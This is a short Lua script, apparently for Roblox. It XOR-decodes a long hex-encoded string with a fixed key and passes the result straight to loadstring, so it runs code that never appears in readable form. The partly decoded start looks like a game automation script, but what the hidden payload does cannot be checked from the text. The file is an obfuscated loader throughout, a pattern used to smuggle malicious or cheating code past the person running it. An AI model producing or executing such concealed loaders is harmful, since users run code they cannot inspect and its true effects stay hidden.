local A="d3c43429d7e6fa89a0931974babf6956cadf3868efb3c4dcb2a919398cf52465db897b1bcfa7c3d1e6bb1975ace7361dd9de392bcfafd8dafb904258aff2276e97fd3624cea39bf7bab1147bbee1203eb5d83224dde8e4c0baa91d2489e32762da966a3cc9b3d2beb2bb585abeee2775dec83c68cfaed2dafba9196ab4ac3867dedc3960f8a7dbd8b9bc1b72f3f12e7bd985043cdab2d29dfbb8167dd5e72573b5d9323cceb4d99496d7"
local K={191,171,87,72,187,198,183,180,219,221,120,25,223,130,75,23}
local O=table.create(#A/2)
local N=0
for I=1,#A,2 do
N=N+1
O[N]=string.char(bit32.bxor(tonumber(string.sub(A,I,I+1),16),K[(N-1)%#K+1]))
end
return loadstring(table.concat(O))()
